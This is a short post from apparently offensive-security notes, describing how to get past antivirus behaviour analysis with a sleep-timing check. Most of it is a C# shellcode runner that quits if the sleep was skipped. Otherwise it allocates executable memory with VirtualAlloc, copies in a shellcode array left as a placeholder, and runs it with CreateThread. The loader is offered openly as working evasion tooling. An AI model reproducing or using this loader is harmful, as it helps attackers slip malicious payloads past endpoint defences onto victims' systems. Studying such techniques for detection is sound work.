---
layout:     post
author:     0x5c4r3
type: docs
permalink: AV_Bypassing_BA
---

<span style="font-size: 35px; color:red"><b>Bypassing Behaviour Analisys</b></span>
&nbsp;
One of the oldest behavior analysis bypass techniques revolves around time delays. If an application is running in a simulator and the heuristics engine encounters a pause or sleep instruction, it will "fast forward" through the delay to the point that the application resumes its actions. This avoids a potentially long wait time during a heuristics scan.

```cs
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Diagnostics;
using System.Runtime.InteropServices;

namespace ConsoleApp1
{
    class Program
    {
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll")]
        static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

        [DllImport("kernel32.dll")]
        static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);

		[DllImport("kernel32.dll")]
		static extern void Sleep(uint dwMilliseconds);

        static void Main(string[] args)
        {

			DateTime t1 = DateTime.Now; //SLEEP FUNC TO CHECK SIMULATION (If skipped, it's an AV simulation, therefore stops execution to not being detected)
		    Sleep(2000);
		    double t2 = DateTime.Now.Subtract(t1).TotalSeconds;
		    if(t2 < 1.5)
		    {
		        return;
		    }
		    
            byte[] buf = new byte[630] {0xfc,0x48,0x83,0xe4, //Change here
            int size = buf.Length;

            IntPtr addr = VirtualAlloc(IntPtr.Zero, 0x1000, 0x3000, 0x40);

            Marshal.Copy(buf, 0, addr, size);

            IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);

            WaitForSingleObject(hThread, 0xFFFFFFFF);
        }
    }
}
```
